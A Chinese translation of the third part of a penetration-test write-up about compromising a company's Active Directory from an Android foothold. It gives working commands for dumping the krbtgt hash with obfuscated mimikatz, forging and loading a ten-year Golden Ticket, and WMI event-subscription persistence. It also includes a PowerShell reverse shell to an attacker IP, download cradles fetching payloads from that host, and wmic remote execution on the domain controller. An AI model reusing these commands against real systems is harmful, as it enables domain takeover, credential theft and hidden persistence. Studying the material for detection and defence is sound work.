
# 【技术分享】公司智能手机安全（三）—— 瞄准域控制器与寻找Golden Ticket


                                阅读量   
                                **88548**
                            
                        |
                        
                                                                                                                                    ![](./img/85962/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[http://resources.infosecinstitute.com/extra-miles/#article](http://resources.infosecinstitute.com/extra-miles/#article)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85962/t01da9f1dae2f83c1ab.jpg)](./img/85962/t01da9f1dae2f83c1ab.jpg)

<br>



翻译：[村雨其实没有雨](http://bobao.360.cn/member/contribute?uid=2671379114)

预估稿费：110RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

本系列前面两个章节，请参见[**这里**](http://bobao.360.cn/learning/detail/3762.html)和[**这里**](http://bobao.360.cn/learning/detail/3763.html)

在离开内部网络前，我们决定取得域控制器的哈希，特别是Kerberos账户(krbtgt)，想要创建一个Golden Ticket*。

译者注：Golden Ticket是指伪造的TGT(Ticket Granting Ticket)，同理Silver Ticket是伪造的TGS(Ticket Granting Server)

Golden Ticket攻击能够让我们创建离线的Kerberos TGT来进行未授权访问，并且伪造任何域用户。此外，它的有效期是十年，换言之只要它被创建了，即使域管理员的凭证发生了改变，也会有效。这是一个权限维持的极佳案例，不是吗？

为了实现这个任务，我们需要的有：

**krbtgt哈希**

**域SID**

**用户名(这里是Administrator)**

**域名称（这里是SUPERCOMPANY）**

以类似的方式(SRVWSUS上的端口转发，改良过的SMBExec等)，我们目前在域控制器上拿到了一个新的本地管理员权限的Powershell。

我们执行了混淆过的mimikatz来获取活动目录用于数据，并将他们保存在hash.txt中:



```
invoke-mymy -command ‘privilege::debug “LSADump::LSA /inject”‘ &gt; hash.txt
The mimikatz script was without the auto-invoke command at the end of the file. We exfiltrated the hash file to our web server. This was its content:
RID : 000001f6 (502)
User : krbtgt
* Primary
LM :
NTLM : 3003567af268a4aXXXXXXXXXXXXXXXXX
Using get-addomain cmdlet, which is automatically imported on Domain Controllers, we got the domain SID:
PS C:test&gt; get-addomain
AllowedDNSSuffixes : {}
ChildDomains : {}
ComputersContainer : CN=Computers,DC=supercompany,DC=local
DeletedObjectsContainer : CN=Deleted Objects,DC=supercompany,DC=local
DistinguishedName : DC=supercompany,DC=local
DNSRoot : supercompany.local
DomainControllersContainer : OU=Domain
Controllers,DC=supercompany,DC=local
DomainMode : Windows2012R2Domain
DomainSID : S-1-5-21-3534665177-2148510708-2241433719
…
```

注意：我们可以从由mimikatz获得的管理员（其uid = 500）获取域SID：

```
S-1-5-21-3534665177-2148510708-2241433719-500
```

现在是时候创建我们的Golden Ticket了



```
invoke-mymy -command ‘”privilege::debug” “Kerberos::golden /admin:Administrator /domain:supercompany.LOCAL /sid:S-1-5-21-3534665177-2148510708-2241433719 /krbtgt:3003567af268a4a94e26f410e84353f1 /ticket:admin.krb”‘
.#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. “A La Vie, A L’Amour”
## /  ## /* * *
##  / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
‘## v ##’ http://blog.gentilkiwi.com/mimikatz     (oe.eo)
‘#####’     with 20 modules * * */
mimikatz(powershell) # privilege::debug
Privilege ’20’ OK
mimikatz(powershell) # Kerberos::golden /admin:Administrator /domain:supercompany.LOCAL /sid:S-1-5-21-3534665177-2148510708-2241433719 /krbtgt:3003567af268a4a94e26f410e84353f1 /ticket:admin.krb
User     : Administrator
Domain    : supercompany.LOCAL (SUPERCOMPANY)
SID     : S-1-5-21-3534665177-2148510708-2241433719
User Id : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3003567af268a4a94e26f410e84353f1 – rc4_hmac_nt
Lifetime : 2/17/2017 4:02:10 PM ; 2/17/2027 4:02:10 PM ; 3/3/2027 4:02:10 PM
-&gt; Ticket : admin.krb
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated
```

最后将Ticket存到文件中就好了,在这之后，我们挑出admin.krb文件，之后会用到。

<br>

**权限维持**

在离开系统之前，我们必须设置一个能够维持对暴露在公网的服务器访问的方法，以供日后使用。在这一步，不被发现并不容易，即使是新手系统管理员也会发现一些端倪。

我们选择了一个机遇WMI特性的更加复杂的方法，利用了InstanceModificationEvent。

在一个WMI对象实例改变了它的寄存器时，它都是作为一个InstanceModificationEvent。在这样的条件下，我们过滤了事件系统启动时间，在系统启动200到300秒之内，我们将为eventconsumer提供一个commandlineeventconsumer。

在SRVWSUS这台服务器上，我们发送了以下命令：



```
$filterName = “JustForTestFilter”
$consumerName = “JustForTestConsumer”
$exePath = “C:windowshelpwindowsindexstorer.bat”
$Query = “SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_System’ AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 300”
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace “rootsubscription” -Arguments @{Name=$filterName;EventNameSpace=”rootcimv2″;QueryLanguage=”WQL”;Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace “rootsubscription” -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exepath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace “rootsubscription” -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

然后再windows隐藏的文件夹里，创建了r.bat，内容如下：

```
powershell -executionpolicy bypass -windowstyle hidden -f C:windowshelpwindowsindexstorer.ps1
```

而r.ps1文件的内容是：



```
$c=New-Object System.Net.Sockets.TCPClient(‘&lt;OUR_PUBLIC_IP&gt;’,443);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length))-ne 0){;
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
$sb=(IEX $data 2&gt;&amp;1 | Out-String );
$sb2=$sb+’PS ‘+(pwd).Path + ‘&gt; ‘;
$sb=([text.encoding]::ASCII).GetBytes($sb2);
$s.Write($sb,0,$sb.Length);
$s.Flush()};
$c.Close()”
```

这将保证它在重新启动时通过SRVWSUS执行本地SYSTEM权限的远程shell。

最后，我们测试了我们拿到的Golden Ticket，还记得admin.krb这个文件吗？

通过SRVWSUS本地系统管理员权限的shell，我们下载了admin.krb，配置了端口转发，并将带有回连指令的脚本r3.ps1上传到SRVWSUS的9000端口。

现在我们在session中加载Ticket：



```
PS C:tmp&gt;Invoke-mymy -command ‘”kerberos::ptt admin.krb”‘
.#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. “A La Vie, A L’Amour”
## /  ## /* * *
##  / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
‘## v ##’ http://blog.gentilkiwi.com/mimikatz (oe.eo)
‘#####’ with 20 modules * * */
mimikatz(powershell) # kerberos::ptt admin.krb
* File: ‘admin.krb’: OK
Using klist it is possible to list our loaded Kerberos tokens:
PS C:tmp&gt; klist
Current LogonId is 0:0x3e7
Cached Tickets: (1)
#0&gt; Client: Administrator @ supercompany.LOCAL
Server: krbtgt/supercompany.LOCAL @ supercompany.LOCAL
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
Start Time: 2/17/2017 1:02:10 (local)
End Time: 2/17/2027 1:02:10 (local)
Renew Time: 2/18/2027 1:02:10 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0x1 -&gt; PRIMARY
Kdc Called:
```

成功了，Ticket成功加载了！

对于下一个操作，我们使用Windows wmic.exe实用程序，它是一个WMI的命令行接口程序，允许通过Kerberos凭证来访问远程系统。

我们在域控制器上复制了r3.ps1，没有任何问题，只需将管理员的Ticket加载到我们的会话中！

```
PS C:tmp&gt;copy c:tmpr3.ps1 \SRVDC1C$windowstempr3.ps1″
```

然后运行：



```
PS C:tmp&gt; wmic /authority:”kerberos:SUPERCOMPANYSRVDC1″ /node:SRVDC1 process call create “powershell -executionpolicy bypass -windowstyle hidden -f c:windowstempr3.ps1”
Executing (Win32_Process)-&gt;Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
ProcessId = 4528;
ReturnValue = 0;
};
```

我们叉着手等了一会，在我们的电脑上就看到了来自SRVDC1的shell：



```
PS C:Windowssystem32&gt; whoami
supercompanyadministrator
```

即使Administrator的密码变了，这种手段也会奏效。

关于Golden Ticket的潜在危险，我有几句话要说：

发现伪造的Kerberos Tickets非常困难([https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515) )

在有证据的情况下，唯一的方法就是重置krbtg密码两次，但这可能会对Active Directory Infrastructure造成严重影响

<br>

**最后要做的**

还记得我们是怎么在SRVWSUS获得第一个powershell远程shell的吗？

我们从企业内部网络的服务器执行了一个远程命令，通过安卓手机的Meterpreter转发这个连接。要是我们失去了Powershell的远程shell，并且再也没有连接到受害者怎么办？Game Over…

我们需要添加对SRVWSUS shell的持久访问权！

怎么做呢？答案是通过从Tomcat的webshell添加访问SRVWSUS的功能：



```
# 1st smbexec command:
IEX (New-Object Net.WebClient).DownloadFile(`’http://&lt;OUR_PUBLIC_IP&gt;/r1.ps1`’,
`’c:tmpr1.ps1`’)
# 2nd smbexec command:
IEX (New-Object Net.WebClient).DownloadFile(`’http://&lt;OUR_PUBLIC_IP&gt;/r1.bat`’,
`’c:tmpr1.bat`’)
# 3rd smbexec command:
‘cmd /c c:tmpr1.bat’
What does r1.bat contain?
@echo off
:loop
powershell -executionpolicy bypass -windowstyle hidden -f c:tmpr.ps1
timeout /t 10
goto loop
```

虽不优雅，但是有效。一旦丢失了连接，等待十秒钟就会重新回连。

我们当然可以加密混淆所有的.ps1脚本，但我们就是想给你展示它的原理。

<br>

**结论**

这就是我们的工作，并没有发明什么新的东西，但是使用Windows内置的功能和一些脚本，我们做了件大事。有时候我们并不需要什么魔法一样的工具，只需要K.I.S.S.原则。

总之，聪明的去办事吧！
